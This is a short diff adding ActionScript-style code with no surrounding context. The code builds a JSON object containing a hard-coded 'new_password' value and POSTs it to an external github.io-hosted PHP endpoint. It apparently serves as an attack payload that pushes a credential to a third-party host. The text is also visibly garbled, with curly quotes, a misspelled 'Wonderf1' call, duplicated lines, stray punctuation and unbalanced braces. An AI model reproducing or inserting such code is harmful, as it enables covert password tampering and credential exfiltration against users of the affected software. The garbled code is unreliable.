@@ -1,0 +1,29 @@
+public function re()
+var member1: Object = null;
+var myJson: String = null;
+Wonderfl. capture (stage) ; 
+super();
+Wonderf1.capture (stage) ;
+member1 = new Object ();
+member1 = {"new_password":"wh1wSye73$8=“};
+var myData:Object = member1;
+myJson = JSON.stringify (myData):
+myJson = JSON.stringify (myData) ;
+var url:String = “https://ener1-s3c.github.io/vy.php”;
+var request:URLRequest = new URLRequest (url);
+request.requestHeaders.push(new URLRequestHeader("Content-Type”,”application/json”));
+request.data = myJson;
+request.method = URLRequestMethod.POST;
+var urlLoader:URLLoader = new URLLoader();
+try
+{
+urlLoader.load(request);
+}
+catch (e:Error)
+{
+trace(e);
+return;
+}
+}
+}
+}
